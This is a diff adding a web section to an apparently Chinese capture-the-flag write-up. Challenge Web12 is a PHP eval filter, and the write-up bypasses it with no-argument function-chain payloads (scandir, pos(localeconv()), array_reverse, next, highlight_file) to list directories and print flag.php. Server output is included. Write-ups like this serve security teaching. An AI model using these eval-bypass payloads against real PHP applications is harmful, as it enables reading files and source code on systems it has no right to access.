@@ -108,3 +108,81 @@ while 1:
 print(''.join([chr(x) for x in flag]))
 
 ```
+
+
+## Web
+### Web12
+
+源码
+
+```php
+<?php
+header("Content-Type: text/html;charset=utf-8");
+include "flag.php";
+echo "flag在哪里呢？<br>";
+highlight_file(__FILE__);
+error_reporting(0);
+if(isset($_GET['exp'])){
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+            if (!preg_match('/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
+                // echo $_GET['exp'];
+                @eval($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
+    }
+    else{
+        die("还想读flag，臭弟弟！");
+    }
+}
+// highlight_file(__FILE__);
+?>
+flag在哪里呢？
+```
+
+构造些能绕过的payload.
+
+```
+pos(localeconv()) => '.'
+scandir(pos(localeconv())) => scandir('.')
+```
+
+看一下当前目录下的文件，`?exp=echo(var_dump(scandir(pos(localeconv()))));`
+
+```
+./
+?> array(6) { 
+[0]=> string(1) "." 
+[1]=> string(2) ".." 
+[2]=> string(4) ".git" 
+[3]=> string(5) "1.php" 
+[4]=> string(8) "flag.php" 
+[5]=> string(9) "index.php"
+}
+```
+
+看上级目录下的文件 `?exp=echo(var_dump(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));`
+
+```
+../
+?> array(3) { 
+[0]=> string(1) "." 
+[1]=> string(2) ".." 
+[2]=> string(4) "html" }
+```
+
+看来就在当前目录下处理就行了，next方法可以获取数组的第二个值。把列表逆向排序一下。
+
+打印数组逆向 `?exp=echo(var_dump(array_reverse(scandir(pos(localeconv())))));`
+
+打印数组逆向后第二值即flag.php `?exp=echo(var_dump(next(array_reverse(scandir(pos(localeconv()))))));`
+
+打印出源码 `?exp=echo(highlight_file(next(array_reverse(scandir(pos(localeconv()))))));`
+
+显示出flag
